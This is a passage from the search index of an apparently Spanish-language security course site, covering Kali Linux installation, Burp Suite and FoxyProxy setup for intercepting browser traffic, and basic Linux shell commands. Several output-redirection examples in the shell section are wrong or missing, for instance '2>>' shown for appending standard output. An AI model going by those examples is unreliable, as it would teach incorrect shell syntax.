relacionados con el ambiente de trabajo durante el transcurso de las actividades del curso, requerimos que utilicen \u003cstrong\u003eKali Linux\u003c/strong\u003e para resolver las tareas y los ejercicios propuestos. A continuación, les explicamos dos formas en las que pueden usar Kali Linux en su computador sin tener que hacer cambios importantes o irreversibles a su configuración actual.\u003c/p\u003e\n\u003ch2 id=\"instalación-en-máquina-virtual-virtualbox\"\u003eInstalación en Máquina Virtual (Virtualbox)\u003c/h2\u003e\n\u003cp\u003eRecomendamos este método para personas con computadores con 8GB o más de RAM, además de al menos 25 GB libres en el disco duro.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePrimero, instala \u003ca href=\"https://www.virtualbox.org/wiki/Downloads\"\u003eVirtualBox\u003c/a\u003e en tu computador. Las instrucciones para hacer esto varían según tu sistema operativo.\u003c/li\u003e\n\u003cli\u003eMientras tanto, baja la imagen de máquina virtual oficial de Kali Linux desde \u003ca href=\"https://www.kali.org/get-kali/#kali-virtual-machines\"\u003eacá\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDespués de instalar VirtualBox, es recomendable instalar el pack de extensiones. Está disponible en el mismo link de descarga de VirtualBox, en la sección VirtualBox Oracle VM VirtualBox Extension Pack. Esto es principalmente para que la máquina virtual use la resolución de pantalla de la ventana en la que está, y no tengamos solo un cuadro pequeño para ver.\u003c/li\u003e\n\u003cli\u003eUna vez esté instalado el programa y haya terminado de bajar la imagen, haz doble click en la segunda. Si el doble click no te sirve, ve a \u0026ldquo;File\u0026rdquo; y luego a \u0026ldquo;Import Appliance\u0026rdquo; en el menú superior, de forma de seleccionar el archivo descargado.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg src=\"../virtualbox_1.jpg\" alt=\"\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLuego, en el cuaddro para importar la máquina, hacer click en \u0026ldquo;Import\u0026rdquo; y aceptar la licencia asociada. El proceso de importación demorará unos minutos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUna vez importada, la máquina se puede correr haciendo doble click en ella. El usuario y la contraseña son \u003ccode\u003ekali\u003c/code\u003e y \u003ccode\u003ekali\u003c/code\u003e respectivamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"instalación-en-un-pendrive-persistente\"\u003eInstalación en un pendrive persistente\u003c/h2\u003e\n\u003cp\u003eEste procedimiento es un poco más largo y complejo que el de la máquina virtual, pero debiesen obtener un rendimiento mucho mejor. Además, no usarán espacio de su disco principal, ya que correrán todo el sistema operativo Kali desde un pendrive. Lo anterior también les da la ventaja de poder mantener su sesión de Kali entre distintos computadores.\u003c/p\u003e\n\u003cp\u003eLes recomendamos usar un pendrive USB 3, con 8 GB de espacio o más. Lamentablemente, el pendrive que usen para esto no podrán usarlo para otras cosas, pero a futuro pueden formatearlo y recuperar su anterior utilidad.\u003c/p\u003e\n\u003cp\u003eLas instrucciones detalladas para crear un pendrive persistente se encuentran \u003ca href=\"https://www.kali.org/docs/usb/usb-persistence/\"\u003een este tutorial oficial\u003c/a\u003e.\u003c/p\u003e\n"},{id:56,href:"/docs/anexos/proxy/",title:"Proxy",description:null,content:"\u003cp\u003ePara poder realizar el análisis web de manera efectiva es necesario instalar un proxy que sea capaz de interceptar,\nmodificar y reenviar todos los requests hacia el servidor, al igual que sus respuestas respectivas.\nEn este caso utilizaremos el navegador FireFox, e instalaremos el plugin FoxyProxy para administrar la conexión\nal proxy, el cual será Burp Suite Community Edition.\u003c/p\u003e\n\u003ch2 id=\"foxyproxy\"\u003eFoxyProxy\u003c/h2\u003e\n\u003cp\u003ePrimero es necesario instalar el plugin. Para eso, ingresar a la tienda de extensiones de FireFox y buscar\npor FoxyProxy, o simplemente ingresar a este \u003ca href=\"https://addons.mozilla.org/es/firefox/addon/foxyproxy-standard/\"\u003elink\u003c/a\u003e.\nInstalar el plugin haciendo click en \u003ccode\u003eAgregar a Firefox\u003c/code\u003e y luego otorgándole los permisos que solicite.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-install.png\" alt=\"Instalar FoxyProxy\"\u003e\u003c/p\u003e\n\u003cp\u003eUna vez instalado, hacer click en el ícono del plugin arriba a la derecha. Esto abrirá unas opciones, de las\ncuales se debe hacer click en \u003ccode\u003eOptions\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-options.png\" alt=\"FoxyProxy Options\"\u003e\u003c/p\u003e\n\u003cp\u003eDentro de \u003ccode\u003eOptions\u003c/code\u003e, hacer click en \u003ccode\u003eAdd\u003c/code\u003e para empezar a crear las configuraciones del proxy.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-add.png\" alt=\"FoxyProxy Add\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, llenar los campos de la siguiente manera: \u003ccode\u003eTitle: Burp\u003c/code\u003e, \u003ccode\u003eProxy Type: HTTP\u003c/code\u003e,\n\u003ccode\u003eProxy IP Address: 127.0.0.1\u003c/code\u003e, \u003ccode\u003ePort: 8080\u003c/code\u003e. Luego guardar.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-settings.png\" alt=\"FoxyProxy Settings\"\u003e\u003c/p\u003e\n\u003cp\u003ePara empezar a redirigir la comunicación a través del proxy, hacer click en el ícono del plugin y seleccionar\nla opción \u003ccode\u003eBurp\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../foxyproxy-activate.png\" alt=\"FoxyProxy Activate\"\u003e\u003c/p\u003e\n\u003ch2 id=\"burp-suite\"\u003eBurp Suite\u003c/h2\u003e\n\u003cp\u003eAhora configuraremos Burp Suite para que puedan interceptar el tráfico. Si están usando Kali Linux ya lo deberían\ntener instalado. De no ser así, descárguenlo de este \u003ca href=\"https://portswigger.net/burp/communitydownload\"\u003elink\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eLo que necesitamos hacer es instalar el certificado de firma de Burp en FireFox para poder interceptar\ny modificar comunicaciones HTTPS. Esto es necesario, ya que Burp recibe mensajes encriptado,\ny luego debe poder desencriptarlos para leerlos. Además, en caso de que el mensaje sea modificado, debe poder\nvolver a encriptarlos. Para realizar esto, el navegador establece una comunicación cifrada con Burp, y a su vez\nBurp establece una comunicación encriptada con el servidor. El navegador necesita tener instalado el certificado\npara poder confiar en Burp antes de establecer la conexión.\u003c/p\u003e\n\u003cp\u003ePara descargar el certificado, abrir Burp. Aparecerá una ventana de configuración, simplemente hagan click\nen \u003ccode\u003eNext\u003c/code\u003e y luego \u003ccode\u003eStart Burp\u003c/code\u003e. Una vez terminado el proceso, en FireFox activar FoxyProxy e ingresar a la URL\n\u003ca href=\"http://burp/\"\u003ehttp://burp/\u003c/a\u003e. Haciendo click en \u003ccode\u003eCA Certificate\u003c/code\u003e se descarga el certificado.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../burp-certificate.png\" alt=\"Burp Certificate\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego, ingresar a las \u003ca href=\"about:preferences\"\u003epreferencias\u003c/a\u003e de FireFox y buscar por la opción \u003ccode\u003ecertificates\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../firefox-preferences.png\" alt=\"Firefox Preferences\"\u003e\u003c/p\u003e\n\u003cp\u003ePara instalar el certificado, hacer click en \u003ccode\u003eView Certificates\u003c/code\u003e, y en la pestaña \u003ccode\u003eAuthorities\u003c/code\u003e\nimportar el certificado. Deberán seleccionar el archivo recientemente descargado (probablemente en\nsu directorio \u003ccode\u003eDownloads\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../firefox-import.png\" alt=\"Firefox Import\"\u003e\u003c/p\u003e\n\u003cp\u003eUna vez hecho esto, ya está todo listo para comenzar a usar Burp Suite.\u003c/p\u003e\n"},{id:57,href:"/docs/anexos/comandos/",title:"Comandos de Terminal de Linux",description:null,content:"\u003cp\u003eUna \u003cem\u003eShell\u003c/em\u003e o \u003cem\u003eTerminal\u003c/em\u003e en la práctica es una interfaz de usuario de texto que permite la ejecución de comandos y programas de tipo script.\u003c/p\u003e\n\u003cp\u003eEn sistemas Linux modernos, puedes interactuar con la \u003cem\u003eShell\u003c/em\u003e usando un emulador de terminal. En varias distribuciones actuales, el emulador de terminal por defecto es \u003ccode\u003ebash\u003c/code\u003e. Sin embargo, en Kali Linux la shell usada por defecto es \u003ccode\u003ezsh\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"abrir-una-ventana-de-terminal\"\u003eAbrir una ventana de terminal\u003c/h2\u003e\n\u003cp\u003eCuando abres una venta del terminal (en Kali linux puedes hacerlo con \u003ccode\u003eCtrl+Alt+T\u003c/code\u003e), esta parte posicionada en una carpeta específica. En general, esa carpeta es la carpeta \u003ccode\u003e$HOME\u003c/code\u003e de tu usuario (Algo así como \u003ccode\u003e/home/_nombreusuario_\u003c/code\u003e). Desde esta ruta, puedes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEjecutar comandos\u003c/li\u003e\n\u003cli\u003eMoverte entre carpetas\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejecutar-comandos\"\u003eEjecutar Comandos\u003c/h2\u003e\n\u003cp\u003eLas shell tienen dos tipos de comandos que pueden ejecutar:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eComandos internos\u003c/strong\u003e, los cuales son \u0026ldquo;keywords especiales\u0026rdquo; de la shell y permiten ejecutar acciones que no están asociadas a un programa en el computador\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003eEjemplos\u003c/em\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eecho HOLA\u003c/code\u003e escribe \u003ccode\u003eHOLA\u003c/code\u003e en la terminal.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecd hola\u003c/code\u003e ingresa a la carpeta \u003ccode\u003ehola\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eComandos externos\u003c/strong\u003e o aplicaciones, los cuales corresponden a aplicaciones guardadas en rutas del computador específicas (las cuales están definidas en la variable \u003ccode\u003e$PATH\u003c/code\u003e). Si el programa no está guardado en una ruta específica, hay que escribir la ruta completa.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePara ejecutar un comando externo (programa), debo escribir la \u003cem\u003eruta absoluta\u003c/em\u003e (se explica más adelante este concepto) de la ubicación del programa, o escribir una \u003cem\u003eruta relativa\u003c/em\u003e si es que el programa no se encuentra en la misma carpeta en la que estoy.\u003c/p\u003e\n\u003cp\u003eSi el programa se encuentra en la misma carpeta en la que estoy, debo ejecutarlo así: `./programa , donde \u003cem\u003eprograma\u003c/em\u003e es el nombre del programa en la misma carpeta. (más adelante se explica por qué esto funciona).\u003c/p\u003e\n\u003cp\u003eSi el programa se encuentra en una ruta definida en el \u003ccode\u003e$PATH\u003c/code\u003e, puedo escribir su nombre solo.\u003c/p\u003e\n\u003ch2 id=\"variables\"\u003eVariables\u003c/h2\u003e\n\u003cp\u003eEn la shell, es posible crear variables definiéndolas con \u003ccode\u003eNOMBRE_VAR=$(valor)\u003c/code\u003e, donde \u003ccode\u003eNOMBRE_VAR\u003c/code\u003e es el nombre de la variable y \u003ccode\u003evalor\u003c/code\u003e es el comando que genera el valor.\u003c/p\u003e\n\u003cp\u003ePara usar esa variable en otro comando, debo anteponerle el símbolo \u003ccode\u003e$\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEjemplo\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"nv\"\u003eVAR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e HOLA\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$VAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e mundo\u0026#34;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"variables-predefinidas\"\u003eVariables Predefinidas\u003c/h3\u003e\n\u003cp\u003eEl terminal tiene disponibles algunas variables útiles desde que inicia:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e$PATH\u003c/code\u003e es una lista de rutas absolutas, separadas por \u003ccode\u003e:\u003c/code\u003e, en las cuales se buscan los comandos externos si se ejecutan solo por su nombre. En general, rutas como \u003ccode\u003e/usr/bin\u003c/code\u003e, \u003ccode\u003e/usr/local/bin\u003c/code\u003e, \u003ccode\u003e/usr/local/sbin\u003c/code\u003e, entre otros.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e$HOME\u003c/code\u003e es la ruta a la carpeta personal del usuario. En general es \u003ccode\u003e/home/\u0026lt;nombre_usuario\u0026gt;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e$PWD\u003c/code\u003e es la ruta en la que se está ubicado en ese momento.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"rutas\"\u003eRutas\u003c/h2\u003e\n\u003cp\u003ePara saber en qué carpeta estoy en el terminal, puedo escribir el comando interno \u003ccode\u003epwd\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003ePara moverme entre carpetas, puedo escribir \u003ccode\u003ecd _ruta_\u003c/code\u003e, donde \u003cem\u003eruta\u003c/em\u003e es la ruta a la que me quiero mover. ¿Pero cómo escribo la ruta?\u003c/p\u003e\n\u003cp\u003eEn los terminales existen dos formas de escribir rutas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRutas Relativas\u003c/strong\u003e: son las rutas que parten sin slash. Para usar estas rutas se considera el directorio actual (\u003ccode\u003e$PWD\u003c/code\u003e), al cual se le concatena la ruta relativa.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEjemplos\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd Downloads\u003c/code\u003e apenas abra el terminal, me moveré a \u003ccode\u003e/home/kali/Downloads\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd home\u003c/code\u003e apenas abra el terminal, probablemente me tire un error (porque en la carpeta \u003ccode\u003e/home/kali\u003c/code\u003e no existe la carpeta \u003ccode\u003ehome\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRutas Absolutas\u003c/strong\u003e: son las rutas que parten con un slash. Estas rutas se resuelven desde la raíz del disco.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEjemplos\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd /Downloads\u003c/code\u003e apenas abra el terminal, probablemente me tire un error (porque no existe la carpeta \u003ccode\u003eDownloads\u003c/code\u003e en la raíz del sistema de archivos)\u003c/li\u003e\n\u003cli\u003eSi escribo \u003ccode\u003ecd /home/kali/Downloads\u003c/code\u003e apenas abra el terminal, me moveré a exactamente esa ruta.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"carpetas-especiales\"\u003eCarpetas especiales\u003c/h3\u003e\n\u003cp\u003eEn todas las carpetas de Linux hay 2 carpetas especiales:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e.\u003c/code\u003e, la cual apunta a sí misma. Esta carpeta se usa para ejecutar programas que están ubicados en la misma carpeta actual (\u003ccode\u003epwd\u003c/code\u003e).\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEjemplo\u003c/strong\u003e: \u003ccode\u003e./comando\u003c/code\u003e considerando que el programa \u003ccode\u003ecomando\u003c/code\u003e se ubica en la carpeta actual.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e..\u003c/code\u003e, la cual apunta a la carpeta superior. Esta carpeta se usa para devolverse entre carpetas.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"ejecutar-como-superusuario\"\u003eEjecutar como superusuario\u003c/h3\u003e\n\u003cp\u003eNo entraremos mucho en detalle en esta parte, pero en Linux existe un tipo de usuario con poderes ilimitados, el cual es conocido como \u003cem\u003esuperusuario\u003c/em\u003e. En general, suele llamarse \u003cem\u003eroot\u003c/em\u003e, pero también es posible asignar a usuarios distintos poderes similares a los del superusuario.\u003c/p\u003e\n\u003cp\u003eCuando estos poderes están asignados (en Kali Linux están asignados por defecto al usuario \u003cem\u003ekali\u003c/em\u003e), puedes ejecutar programas con estos poderes anteponiendo la palabra \u003ccode\u003esudo\u003c/code\u003e al comando que quieres ejecutar. A veces para confirmar la ejecución, la terminal te pide la contraseña del usuario actual.\u003c/p\u003e\n\u003ch2 id=\"pasar-parámetros-a-un-comando\"\u003ePasar parámetros a un comando\u003c/h2\u003e\n\u003cp\u003eCuando se ejecuta un comando, éste en general puede recibir parámetros o argumentos. La estructura de los parámetros es distinta para cada comando, sin embargo, en todos los casos ;os argumentos se separan por espacios. Las siguientes estructuras se suelen dar para definir argumentos de los comandos, las cuales no son excluyentes entre sí.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eArgumentos posicionales\u003c/strong\u003e: es una cadena de texto limitada por espacios. Si se quiere entregar un argumento que contenga espacios, hay que envolver el texto en comillas. \u003cstrong\u003eEjemplo\u003c/strong\u003e: \u003ccode\u003ecomando bla ble bli\u003c/code\u003e recibe 3 argumentos: \u003ccode\u003ebla\u003c/code\u003e, \u003ccode\u003eble\u003c/code\u003e, \u003ccode\u003ebli\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFlags de una letra\u003c/strong\u003e: Parámetro parte por un guion, seguido de una letra (mayúscula o minúscula). A veces al parámetro le sigue un valor (igual que antes, delimitado por espacios). Otras veces, el parámetro y su valor están unidos por un signo \u003ccode\u003e=\u003c/code\u003e A veces la opción no lleva nada después. \u003cstrong\u003eEjemplos\u003c/strong\u003e: \u003ccode\u003ecomando -a -b ble\u003c/code\u003e, \u003ccode\u003ecomando2 -c=bli\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFlags de muchas letras\u003c/strong\u003e: Parámetro parte por dos guiones, seguido de texto (letras, números, guiones). Al igual que en el caso anterior, puede tener un valor asignado, el cual está separado del argumento por un espacio o un signo igual. Incluso en algunos casos, la opción de muchas letras parte solo con un guion. \u003cstrong\u003eEjemplos\u003c/strong\u003e: \u003ccode\u003ecomando --flag-larga=bla\u003c/code\u003e, \u003ccode\u003ecomando2 --flag-larga ble\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"entrada-estándar-salida-estándar-y-salida-de-errores\"\u003eEntrada Estándar, Salida Estándar y Salida de Errores\u003c/h2\u003e\n\u003cp\u003eSe conoce como \u003cem\u003eentrada estándar\u003c/em\u003e (\u003ccode\u003estdin\u003c/code\u003e) en la terminal a el campo de texto por el cual uno escribe los comandos. Entonces, los comandos que usan la entrada estándar reciben los datos por defecto desde el mismo terminal.\u003c/p\u003e\n\u003cp\u003ePor otro lado, la \u003cem\u003esalida estándar\u003c/em\u003e (\u003ccode\u003estdout\u003c/code\u003e) es la misma pantalla de terminal, es decir, por donde se muestran los valores de ejecución de nuestros comandos y los textos que se usan como argumentos de comandos como \u003ccode\u003ecat\u003c/code\u003e o \u003ccode\u003eecho\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eAdemás, cuando un programa genera mensajes de error, estos mensajes suelen salir por la \u003cem\u003esalida de errores estándar\u003c/em\u003e (\u003ccode\u003estderr\u003c/code\u003e). Por defecto, los errores son redirigidos a la pantalla del terminal, al igual que los mensajes de la salida estándar.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEjemplo\u003c/strong\u003e si uno ejecuta solamente el comando \u003ccode\u003ecat\u003c/code\u003e sin parámetros, el programa se quedará esperando entrada desde la \u003cem\u003eentrada estándar\u003c/em\u003e. Esto significa que uno podrá escribir libremente texto, el cual será devuelto por la \u003cem\u003esalida estándar\u003c/em\u003e cada vez que presiones \u003ccode\u003eenter\u003c/code\u003e. Para detener la entrada de texto, hay que enviar la señal \u003ccode\u003eEOF\u003c/code\u003e (End of File), la cual se ejecuta con la combinación de teclas \u003ccode\u003eCtrl+D\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"concatenar-comandos\"\u003eConcatenar comandos\u003c/h2\u003e\n\u003cp\u003eSi se quieren concatenar las salidas de distintos comandos para hacerlas entradas de otros comandos, se usa el operador \u003ccode\u003epipe\u003c/code\u003e (\u003ccode\u003e|\u003c/code\u003e). Por ejemplo, si quiero ejecutar \u003ccode\u003estrings\u003c/code\u003e sobre un archivo y luego pasar esa salida por un \u003ccode\u003egrep\u003c/code\u003e, lo hago de la siguiente forma:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eEl terminal mostrará solo la salida de \u003ccode\u003egrep\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"leer-y-escribir-archivos\"\u003eLeer y escribir archivos\u003c/h2\u003e\n\u003cp\u003eSi quiero que \u003cstrong\u003ela entrada estándar\u003c/strong\u003e de un comando sea el contenido de un archivo, puedo usar el operador \u003ccode\u003emenor-que\u003c/code\u003e (\u003ccode\u003e\u0026lt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003egrep CC5325 \u0026lt; archivo.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSi quiero que \u003cstrong\u003ela salida estándar\u003c/strong\u003e de un comando se guarde en un archivo (sobreescribiéndolo si existe), puedo usar el operador \u003ccode\u003emayor-que\u003c/code\u003e (\u003ccode\u003e\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e \u0026gt; salida.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSi quiero que \u003cstrong\u003ela salida estándar\u003c/strong\u003e de un comando se guarde en un archivo (agregando texto al final si existe), puedo usar el operador \u003ccode\u003edoble mayor-que\u003c/code\u003e (\u003ccode\u003e\u0026gt;\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e 2\u0026gt;\u0026gt; salida.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSi quiero que \u003cstrong\u003ela salida de error estándar\u003c/strong\u003e de un comando se guarde en un archivo (sobreescribiéndolo si existe), puedo usar el operador \u003ccode\u003emayor-que\u003c/code\u003e con un \u003ccode\u003e2\u003c/code\u003e a la izquierda (\u003ccode\u003e2\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cp\u003eSi quiero que \u003cstrong\u003ela salida de error estándar\u003c/strong\u003e de un comando se guarde en un archivo (agregando texto al final si existe), puedo usar el operador \u003ccode\u003edoble mayor-que\u003c/code\u003e con un \u003ccode\u003e2\u003c/code\u003e a la izquierda (\u003ccode\u003e2\u0026gt;\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e 2\u0026gt;\u0026gt; salida.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"redirigir-salidas-y-entradas\"\u003eRedirigir Salidas y Entradas\u003c/h2\u003e\n\u003cp\u003ePuedo redirigir juntas la salida estandar y la salida de error estándar a un mismo archivo con el operador \u003ccode\u003e2\u0026gt;\u0026amp;1\u003c/code\u003e al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e 2\u0026gt;\u0026gt; salida.txt 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"scripts-de-shell\"\u003eScripts de Shell\u003c/h2\u003e\n\u003cp\u003eLa \u003ccode\u003eshell\u003c/code\u003e incluye internamente un lenguaje de programación completo, con estructuras de control de flujo, iteraciones, definición de funciones, entre otros. Uno puede escribir código de script en el mismo terminal, o escribirlo en un archivo cuya primera línea sea similar a esta:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"cp\"\u003e#! /bin/bash\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePara ejecutar este archivo, hay que cambiar sus permisos para que se permita la ejecución (\u003ccode\u003echmod 755 archivo.sh\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eNo entraremos en detalle de cómo crear scripts de shell acá, pero les recomendamos \u003ca href=\"https://www.tutorialspoint.com/unix/shell_scripting.htm\"\u003eesta referencia\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"comandos-útiles\"\u003eComandos útiles\u003c/h2\u003e\n\u003cp\u003eLa siguiente lista de comandos útiles irá creciendo con el tiempo, según los comandos que veamos en el curso.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eman [comando]\u003c/code\u003e - \u003cem\u003eMuestra información sobre el comando\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003ecat [archivo]\u003c/code\u003e - \u003cem\u003eMuestra el contenido de un archivo\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003egrep\u003c/code\u003e - \u003cem\u003eBuscar patrones en un texto\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003estrings [archivo]\u003c/code\u003e - \u003cem\u003eMuestra los caracteres ascii dentro de un archivo\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003ewhatis\u003c/code\u003e - \u003cem\u003eMuestra en una linea el uso de un comando\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003eunzip [archivo]\u003c/code\u003e - \u003cem\u003eDescomprime un archivo .zip\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003efile [archivo]\u003c/code\u003e - \u003cem\u003eDice que tipo de archivo es el archivo dado\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003exxd [archivo]\u003c/code\u003e - \u003cem\u003eMuestra todo el contenido del archivo, pero en hexadecimal con su representación ascii a la derecha\u003c/em\u003e\u003c/p\u003e\n"},{id:58,href:"/docs/anexos/referencias/",title:"Referencias",description:null,content:"\u003cp\u003eA continuación se mencionan las referencias usadas para la realización de cada capítulo del apunte. También se agregan algunas referencias extra que podrían ser útiles para profundizar en contenidos.\u003c/p\u003e\n\u003ch2 id=\"esteganografía\"\u003eEsteganografía\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCodificaciones\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Character_encoding\"\u003eCodificaciones de Caracteres (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Unicode\"\u003eUnicode (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/ASCII\"\u003eASCII (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859\"\u003eISO/IEC 8859 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca 